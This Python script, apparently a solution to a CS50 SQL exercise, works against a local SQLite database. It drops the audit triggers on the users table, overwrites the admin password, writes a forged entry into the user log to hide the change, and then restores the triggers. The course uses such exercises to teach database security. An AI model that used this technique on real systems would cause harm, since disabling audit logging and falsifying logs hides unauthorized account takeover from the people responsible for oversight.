from cs50 import SQL


db = SQL("sqlite:///dont-panic.db")


db.execute('DROP TRIGGER "log_user_updates";')
db.execute('DROP TRIGGER "log_user_deletes";')
db.execute('DROP TRIGGER "log_user_inserts";')

password = input("Enter a password: ")

db.execute(
    """
    UPDATE "users"
    SET "password" = ?
    WHERE "username" = 'admin';
    """,
    password)
print("Hacked!")


db.execute(
  """INSERT INTO "user_logs" ("type","old_username","new_username","old_password","new_password")
     VALUES
     ('update','admin','admin','e10adc3949ba59abbe56e057f20f883e','44bf025d27eea66336e5c1133c3827f7');"""
)


db.execute(
  """CREATE TRIGGER "log_user_updates"
AFTER UPDATE OF "username", "password" ON "users"
FOR EACH ROW
BEGIN
     INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
     VALUES ('update', OLD."username", NEW."username", OLD."password", NEW."password");
END;"""
)

db.execute(
  """CREATE TRIGGER "log_user_deletes"
AFTER DELETE ON "users"
FOR EACH ROW
BEGIN
    INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
    VALUES ('delete', OLD."username", NULL, OLD."password", NULL);
END;"""
)

db.execute(
  """CREATE TRIGGER "log_user_inserts"
AFTER INSERT ON "users"
FOR EACH ROW
BEGIN
     INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
     VALUES ('insert', NULL, NEW."username", NULL, NEW."password");
END;"""
)
